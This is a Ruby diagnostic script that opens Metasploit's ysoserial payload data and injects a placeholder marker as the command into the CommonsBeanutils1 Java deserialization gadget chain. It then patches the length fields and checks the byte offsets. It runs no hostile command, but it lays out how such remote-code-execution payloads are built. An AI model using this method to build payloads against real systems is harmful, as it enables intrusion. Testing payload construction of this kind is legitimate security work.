#!/usr/bin/env ruby
# loop3 t7 C1 — 诊断：验证命令字符串是否正确注入明文序列化体
require 'json'
require 'base64'
require 'digest'

chain = 'CommonsBeanutils1'
cmd   = 'MARKERLOOP3T7ZZZ'
json_path = '/usr/share/metasploit-framework/data/ysoserial_payloads.json'

payloads = JSON.parse(File.read(json_path, mode: 'rb'))['bash']
p = payloads[chain]
puts "status=#{p['status']} bufferOffset=#{p['bufferOffset'].inspect} lengthOffset=#{p['lengthOffset'].inspect}"

bytes = Base64.decode64(p['bytes']).dup
puts "ORIG_LEN=#{bytes.length}"
# 原始模板里命令占位符是什么？
[577, 1811].each do |lo|
  l = bytes[(lo - 1)..lo].unpack1('n')
  puts "lengthOffset=#{lo} -> u16=#{l}"
end
bo = p['bufferOffset'].first
puts "bufferOffset=#{bo} bytes around:"
puts "  BEFORE(#{bo-1-30},#{bo-1}): #{bytes[(bo-1-30)...(bo-1)].inspect}"
puts "  AFTER (#{bo-1},#{bo-1+30}): #{bytes[(bo-1)...(bo-1+30)].inspect}"

# 注入
bytes2 = bytes.dup
bytes2[bo - 1] = bytes2[bo - 1] + cmd
p['lengthOffset'].each do |lo|
  len = bytes2[(lo - 1)..lo].unpack1('n')
  len += cmd.length.ord
  bytes2[(lo - 1)..lo] = [len].pack('n')
end
puts "INJECTED_LEN=#{bytes2.length} (delta=#{bytes2.length - bytes.length}, cmd.len=#{cmd.length})"
idx = bytes2.index(cmd)
puts "cmd found at index=#{idx} (expected #{bo})"
puts "  context: #{bytes2[(idx-30)...(idx+cmd.length+10)].inspect}" if idx
[577, 1811].each do |lo|
  l = bytes2[(lo - 1)..lo].unpack1('n')
  puts "after patch lengthOffset=#{lo} -> u16=#{l}"
end
# 原始模板里命令原本是什么（找 ysoserial 的占位）
i = bytes.index('ysoserial')
puts "ysoserial placeholder at=#{i}"
puts "  ctx: #{bytes[(i-20)...(i+40)].inspect}" if i
